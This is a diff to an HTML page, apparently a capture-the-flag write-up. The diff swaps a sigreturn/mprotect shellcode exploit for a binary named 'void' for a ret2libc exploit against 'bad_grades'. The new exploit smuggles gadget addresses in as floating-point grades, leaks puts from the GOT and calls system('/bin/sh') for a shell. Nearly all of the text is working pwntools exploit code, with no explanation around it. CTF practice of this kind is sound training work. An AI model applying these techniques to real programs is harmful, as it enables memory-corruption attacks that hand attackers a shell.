@@ -250,40 +250,76 @@ return x[0]<br>
 <h2> Exploit </h2>
 <blockquote><code>
 ```<br>
+def double_pointer(pointer_value):<br>
+    <br>
+    byte_string = p64(pointer_value)<br>
+    hex_byte_string = binascii.hexlify(byte_string)<br>
+    x = struct.unpack('d', hex_byte_string.decode('hex'))<br>
+    return x[0]<br>
+<br>
 from pwn import *<br>
-context.arch = 'amd64'<br>
-context.log_level = "debug"<br>
-
-#p = remote("tamuctf.com", 443, ssl=True, sni="void")<br>
-p = process('./void')<br>
-#gdb.attach(p, gdbscript='set disassembly-flavor intel\nb*main\nc\n')<br>
-
-main = 0x0000000000401000<br>
-ret = 0x40101a<br>
-syscall = 0x0000000000401018<br>
-start = 0x400020<br>
-
-frame = SigreturnFrame()<br>
-frame.rax = 10<br>
-frame.rdi = 0x00000000400000<br>
-frame.rsi = 0x1000<br>
-frame.rdx = 0x7<br>
-frame.rsp = 0x00000000400018# ptr to start<br>
-frame.rip = syscall# mprotect syscall<br>
-
-chain = p64(main)<br>
-
-print(str(frame))<br>
-pay = p64(main) + p64(syscall) + bytes(frame)<br>
-p.send(pay)<br>
-sleep(0.1)<br>
-
-p.send(p64(syscall).ljust(15, b'\x00'))<br>
-sleep(0.1)<br>
-p.send(p64(start) + asm('add rsp, 100') + asm(shellcraft.sh()))<br>
-sleep(0.1)<br>
-
+import struct<br>
+import time<br>
+<br>
+p = process('./bad_grades')<br>
+<br>
+gdb.attach(p, gdbscript = 'set disassembly-flavor intel\nb*0x4010e7\nc\n')<br>
+p.recv()<br>
+p.sendline('2')<br>
+p.sendline(str(39))<br>
+<br>
+for i in range(33):<br>
+	p.sendline('1')<br>
+p.recv()<br>
+p.sendline('.')<br>
+<br>
+# gadgets<br>
+pop_rdi = 0x0000000000401263<br>
+puts_got = 0x601fa8<br>
+puts_plt = 0x400680<br>
+main = 0x00401108<br>
+ret = 0x401107<br>
+<br>
+#p.sendline(str(2.0744145*(10**-317)))<br>
+p.sendline('.')<br>
+#p.sendline(str(double_pointer(ret)))<br>
+p.sendline(str(double_pointer(pop_rdi)))<br>
+p.sendline(str(double_pointer(puts_got)))<br>
+p.recv()<br>
+p.sendline(str(double_pointer(puts_plt)))<br>
+p.sendline(str(double_pointer(main)))<br>
+<br>
+p.recvline()<br>
+leak = u64(p.recvline()[:-1].ljust(8, '\x00'))<br>
+info('leak: %s'%hex(leak))<br>
+<br>
+system = leak - 0x32190<br>
+binsh = leak + 0x13019d<br>
+<br>
+info('system: %s'%hex(system))<br>
+info('binsh: %s'%hex(binsh))<br>
+<br>
+#p.recv()<br>
+p.sendline('2')<br>
+p.sendline(str(38))<br>
+<br>
+for i in range(33):<br>
+	p.sendline('1')<br>
+p.recv()<br>
+p.sendline('.')<br>
+p.sendline('.')<br>
+#p.sendline(str(double_pointer(ret)))<br>
+p.sendline("{}".format(double_pointer(pop_rdi)))<br>
+p.recv()<br>
+print(double_pointer(binsh))<br>
+<br>
+<br>
+p.sendline("{}".format(double_pointer(binsh) + 0.63 * (10**(-314-9))))<br>
+p.sendline("{}".format(double_pointer(system) + 0.00000000063 * (10**-314)))<br>
+<br>
+<br>
 p.interactive()<br>
+<br>
 ```<br>
 	</code></blockquote>
 
